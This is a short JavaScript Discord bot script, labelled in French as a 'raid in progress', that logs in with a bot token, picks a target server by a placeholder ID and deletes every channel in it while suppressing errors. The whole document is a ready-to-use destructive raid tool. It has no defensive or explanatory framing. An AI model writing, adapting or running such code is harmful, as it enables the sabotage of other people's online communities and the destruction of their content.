const Discord = require('discord.js');
const client = new Discord.Client();

client.on('ready', async () => {
    console.log(`Raid en cours... ${client.user.tag}`)
    const guild = client.guilds.get('SERVER_ID_ATTACK')
    guild.channels.forEach(channel => {
        channel.delete().catch(err => err)
    })
})

client.login('Your Token')